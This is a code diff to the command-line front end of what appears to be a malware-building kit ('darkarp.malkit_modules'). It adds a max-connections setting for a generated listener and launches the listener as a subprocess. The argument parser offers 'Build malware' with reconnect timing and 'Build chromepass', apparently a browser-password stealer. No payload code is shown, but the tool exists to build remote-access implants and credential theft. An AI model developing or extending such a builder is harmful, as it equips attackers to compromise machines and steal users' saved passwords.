@@ -5,6 +5,7 @@ import os
 import time
 
 from progress.spinner import Spinner
+from subprocess import call
 from darkarp.malkit_modules import build
 # from testing import build
 
@@ -23,6 +24,10 @@ def check_folders():
 
 
 def build_listener(args):
+    if args.max_connections:
+        connections_max = args.max_connections
+    else:
+        connections_max = CONFIG["LISTENER"]["CONNECTIONS_MAX"]
     temp_listener = CONFIG["TEMPLATES"]["listener"]
     check_folders()
     port = args.p
@@ -31,6 +36,8 @@ def build_listener(args):
 
     listener_script_final = listener_script.replace(
         "<<PORT>>", str(port))
+    listener_script_final = listener_script_final.replace(
+        "<<CONNECTIONS_MAX>>", connections_max)
     with open("listeners/listener.py", "w") as f:
         f.write(listener_script_final)
 
@@ -38,7 +45,7 @@ def build_listener(args):
         while True:
             start = input("Would you like to start the listener? [y/n]> ")
             if start.lower() == "y" or start.lower() == 'yes':
-                exec(open("listeners/listener.py").read(), globals())
+                call(["python", "listeners/listener.py"])
                 break
             elif start.lower() == 'n' or start.lower() == "no":
                 break
@@ -225,6 +232,12 @@ def getOptions():
         default=False,
         action='store_true',
         required=False)
+    parser_build_listener.add_argument(
+        "--max_connections",
+        type=str,
+        metavar=f"Max number of possible connections",
+        required=False
+    )
     parser_build_listener.set_defaults(func=build_listener)
 
     # Build malware
@@ -258,6 +271,7 @@ def getOptions():
         metavar=f"Max time to reconnect, chosen at random between min and max",
         required=False
     )
+
     parser_build_malware.set_defaults(func=build_malware)
 
     # Build chromepass
